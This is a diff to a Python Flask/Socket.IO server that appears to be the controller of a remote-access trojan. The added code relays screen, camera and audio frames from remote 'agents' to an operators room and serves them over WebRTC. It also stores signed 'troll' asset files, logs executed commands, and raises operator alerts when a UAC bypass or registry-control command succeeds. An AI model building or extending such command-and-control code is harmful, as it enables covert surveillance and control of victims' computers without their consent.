+    expires = int(time.time() + 3600)
+    sig_src = f'{asset_id}.{expires}.{Config.SECRET_KEY}'
+    signature = hashlib.sha256(sig_src.encode()).hexdigest()
+    TROLL_ASSETS[asset_id] = {
+        'path': full_path,
+        'filename': up['filename'],
+        'expires': expires,
+        'created_at': time.time(),
+        'size': len(file_bytes)
+    }
+    # Build absolute URL
+    try:
+        base_url = request.host_url.rstrip('/')
+    except Exception:
+        base_url = f"http://{Config.HOST}:{Config.PORT}"
+    url = f"{base_url}/troll-assets/{asset_id}?exp={expires}&sig={signature}"
+    emit('troll_asset_ready', {'upload_id': upload_id, 'asset_id': asset_id, 'url': url, 'size': len(file_bytes)}, room=request.sid)
 
 @socketio.on('download_file')
 def handle_download_file(data):
@@ -4596,7 +5132,17 @@ def handle_request_video_frame(data):
     if agent_id and agent_id in VIDEO_FRAMES_H264:
         frame = VIDEO_FRAMES_H264[agent_id]
         # Send as base64 for browser demo; in production, use ArrayBuffer/binary
-        emit('video_frame', {'frame': base64.b64encode(frame).decode('utf-8')})
+        try:
+            if isinstance(frame, (bytes, bytearray)):
+                b64 = base64.b64encode(frame).decode('utf-8')
+            elif isinstance(frame, str):
+                s = frame.strip()
+                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
+            else:
+                return
+            emit('video_frame', {'frame': b64})
+        except Exception:
+            pass
 
 @socketio.on('request_audio_frame')
 def handle_request_audio_frame(data):
@@ -4604,7 +5150,17 @@ def handle_request_audio_frame(data):
     if agent_id and agent_id in AUDIO_FRAMES_OPUS:
         frame = AUDIO_FRAMES_OPUS[agent_id]
         # Send as base64 for browser demo; in production, use ArrayBuffer/binary
-        emit('audio_frame', {'frame': base64.b64encode(frame).decode('utf-8')})
+        try:
+            if isinstance(frame, (bytes, bytearray)):
+                b64 = base64.b64encode(frame).decode('utf-8')
+            elif isinstance(frame, str):
+                s = frame.strip()
+                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
+            else:
+                return
+            emit('audio_frame', {'frame': b64})
+        except Exception:
+            pass
 
 @socketio.on('request_camera_frame')
 def handle_request_camera_frame(data):
@@ -4612,7 +5168,17 @@ def handle_request_camera_frame(data):
     if agent_id and agent_id in CAMERA_FRAMES_H264:
         frame = CAMERA_FRAMES_H264[agent_id]
         # Send as base64 for browser demo; in production, use ArrayBuffer/binary
-        emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})
+        try:
+            if isinstance(frame, (bytes, bytearray)):
+                b64 = base64.b64encode(frame).decode('utf-8')
+            elif isinstance(frame, str):
+                s = frame.strip()
+                b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
+            else:
+                return
+            emit('camera_frame', {'frame': b64})
+        except Exception:
+            pass
 
 
 
@@ -4686,6 +5252,19 @@ def handle_agent_telemetry(data):
         AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
         AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
         AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
+        try:
+            latency = float(data.get('latency_ms') or data.get('latency') or 0)
+            loss = float(data.get('packet_loss') or 0)
+            mgr = getattr(handle_agent_telemetry, '_mgr', None)
+            if mgr is None:
+                mgr = AdaptiveStreamingManager()
+                handle_agent_telemetry._mgr = mgr
+            mgr.adjust_quality(agent_id, latency, loss)
+            q = mgr.agent_quality.get(agent_id)
+            if q:
+                AGENT_FEATURE_FLAGS[agent_id]['quality_level'] = q
+        except Exception:
+            pass
         emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
 
 # --- WebRTC Socket.IO Event Handlers ---
@@ -5313,6 +5892,143 @@ def handle_webrtc_implement_frame_dropping(data):
 
 # WebRTC scaffolding code removed - not currently active
 
+@app.route('/api/webrtc/config', methods=['GET'])
+def http_webrtc_config():
+    try:
+        return jsonify({
+            'enabled': WEBRTC_CONFIG.get('enabled', False),
+            'iceServers': WEBRTC_CONFIG.get('ice_servers', []),
+            'codecs': WEBRTC_CONFIG.get('codecs', {}),
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def _get_viewer_token():
+    try:
+        token = session.get('webrtc_viewer_id')
+    except Exception:
+        token = None
+    if not token:
+        token = secrets.token_hex(16)
+        session['webrtc_viewer_id'] = token
+    return token
+
+@app.route('/api/webrtc/viewer/connect', methods=['POST'])
+def http_webrtc_viewer_connect():
+    if not WEBRTC_AVAILABLE:
+        return jsonify({'success': False, 'error': 'WebRTC not available'}), 400
+    data = request.get_json(silent=True) or {}
+    agent_id = data.get('agent_id')
+    if not agent_id or agent_id not in WEBRTC_STREAMS:
+        return jsonify({'success': False, 'error': 'Agent not available for WebRTC'}), 400
+    try:
+        viewer_token = _get_viewer_token()
+        viewer_pc = RTCPeerConnection()
+        for ice_server in WEBRTC_CONFIG['ice_servers']:
+            viewer_pc.addIceServer(ice_server)
+        WEBRTC_VIEWERS[viewer_token] = {
+            'agent_id': agent_id,
+            'pc': viewer_pc,
+            'streams': {}
+        }
+        agent_streams = WEBRTC_STREAMS.get(agent_id, {})
+        for track_kind, tracks in agent_streams.items():
+            try:
+                if isinstance(tracks, list):
+                    for t in tracks:
+                        sender = viewer_pc.addTrack(t)
+                        if track_kind not in WEBRTC_VIEWERS[viewer_token]['streams']:
+                            WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = []
+                        WEBRTC_VIEWERS[viewer_token]['streams'][track_kind].append(sender)
+                else:
+                    sender = viewer_pc.addTrack(tracks)
+                    WEBRTC_VIEWERS[viewer_token]['streams'][track_kind] = [sender]
+            except Exception:
+                pass
+        try:
+            loop = asyncio.get_event_loop()
+            future = asyncio.run_coroutine_threadsafe(viewer_pc.createOffer(), loop)
+            offer = future.result(timeout=5)
+            try:
+                asyncio.run_coroutine_threadsafe(viewer_pc.setLocalDescription(offer), loop)
+            except RuntimeError:
+                async def set_local_desc():
+                    await viewer_pc.setLocalDescription(offer)
+                asyncio.run(set_local_desc())
+            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
+        except RuntimeError:
+            async def create_offer_async():
+                offer = await viewer_pc.createOffer()
+                await viewer_pc.setLocalDescription(offer)
+                return offer
+            offer = asyncio.run(create_offer_async())
+            return jsonify({'success': True, 'offer': offer.sdp, 'type': offer.type})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/answer', methods=['POST'])
+def http_webrtc_viewer_answer():
+    data = request.get_json(silent=True) or {}
+    answer_sdp = data.get('answer')
+    token = session.get('webrtc_viewer_id')
+    if not answer_sdp or not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        answer = RTCSessionDescription(sdp=answer_sdp, type='answer')
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.setRemoteDescription(answer), loop)
+        except RuntimeError:
+            async def set_remote_desc():
+                await viewer_pc.setRemoteDescription(answer)
+            asyncio.run(set_remote_desc())
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/ice', methods=['POST'])
+def http_webrtc_viewer_ice():
+    data = request.get_json(silent=True) or {}
+    candidate = data.get('candidate')
+    token = session.get('webrtc_viewer_id')
+    if not candidate or not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': False, 'error': 'Invalid viewer session'}), 400
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.addIceCandidate(candidate), loop)
+        except RuntimeError:
+            async def add_ice():
+                await viewer_pc.addIceCandidate(candidate)
+            asyncio.run(add_ice())
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/webrtc/viewer/disconnect', methods=['POST'])
+def http_webrtc_viewer_disconnect():
+    token = session.get('webrtc_viewer_id')
+    if not token or token not in WEBRTC_VIEWERS:
+        return jsonify({'success': True})
+    try:
+        viewer_pc = WEBRTC_VIEWERS[token]['pc']
+        try:
+            loop = asyncio.get_event_loop()
+            asyncio.run_coroutine_threadsafe(viewer_pc.close(), loop)
+        except RuntimeError:
+            async def close_viewer():
+                await viewer_pc.close()
+            asyncio.run(close_viewer())
+    except Exception:
+        pass
+    try:
+        del WEBRTC_VIEWERS[token]
+    except Exception:
+        pass
+    return jsonify({'success': True})
+
 # Additional WebSocket events for real-time updates
 
 @socketio.on('performance_update')
@@ -5381,6 +6097,20 @@ def handle_command_result(data):
         'execution_time': execution_time,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
     }
+    try:
+        db = get_db()
+        history = DbCommandHistory(
+            agent_id=agent_id,
+            command=str(command or ''),
+            output=str(safe_output or ''),
+            timestamp=datetime.datetime.utcnow(),
+            success=bool(success)
+        )
+        db.add(history)
+        db.commit()
+        db.close()
+    except Exception:
+        pass
     
     print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
     emit('command_result', result_data, room='operators', broadcast=True)
@@ -5405,6 +6135,34 @@ def handle_command_result(data):
                     "Command Failure",
                     f'Agent {AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")} ({agent_id}) command "{command}" failed. Output: {safe_output[:500]}'
                 )
+        except Exception:
+            pass
+        try:
+            cmd = (command or '')
+            lc = cmd.lower()
+            notif_type = 'success' if success else 'error'
+            if ('uac' in lc) or ('bypass' in lc):
+                emit('agent_notification', {
+                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
+                    'type': notif_type,
+                    'title': 'UAC Bypass',
+                    'message': f'{cmd} {"succeeded" if success else "failed"}',
+                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                    'agent_id': agent_id,
+                    'read': False,
+                    'category': 'security'
+                }, room='operators', broadcast=True)
+            elif ('registry' in lc) or ('reg ' in lc) or ('policy' in lc):
+                emit('agent_notification', {
+                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
+                    'type': notif_type,
+                    'title': 'Registry Control',
+                    'message': f'{cmd} {"succeeded" if success else "failed"}',
+                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                    'agent_id': agent_id,
+                    'read': False,
+                    'category': 'security'
+                }, room='operators', broadcast=True)
         except Exception:
             pass
 
